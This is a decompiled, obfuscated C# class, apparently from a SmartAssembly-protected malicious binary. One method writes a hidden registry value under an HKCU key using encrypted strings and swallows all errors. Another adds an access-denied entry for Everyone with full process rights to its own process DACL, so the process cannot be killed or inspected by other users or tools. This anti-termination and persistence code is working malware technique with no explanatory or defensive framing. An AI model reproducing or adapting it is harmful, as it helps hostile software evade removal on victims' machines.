using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ybfSLIGKlaODvJ;

internal sealed class CDCQwbhpmJ
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr FsKhISNYOmK, int LqjMvnlHYPvI, [Out] byte[] RosInpdkHXEtbg, uint dDDrHFebGdebAk, out uint oxddwdJrPkdQ);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr MrKOUnidzGPv, int USBlvTiwVUKiV, [In] byte[] LsMYgDgLvKoPIz);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void qqPUkrMUmwPNT(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107402523)));
			registryKey.SetValue(iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107402930)), getString_0(107404016));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor liLSbunqyBEJhC(IntPtr intptr_0)
	{
		byte[] rosInpdkHXEtbg = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, rosInpdkHXEtbg, 0u, out var oxddwdJrPkdQ);
		if ((long)oxddwdJrPkdQ > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, rosInpdkHXEtbg = new byte[oxddwdJrPkdQ], oxddwdJrPkdQ, out oxddwdJrPkdQ))
		{
			return null;
		}
		return new RawSecurityDescriptor(rosInpdkHXEtbg, 0);
	}

	private void ZGmVoBeNJCif(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void LvYqbmKZjasTc()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = liLSbunqyBEJhC(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			ZGmVoBeNJCif(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static CDCQwbhpmJ()
	{
		Strings.CreateGetStringDelegate(typeof(CDCQwbhpmJ));
	}
}
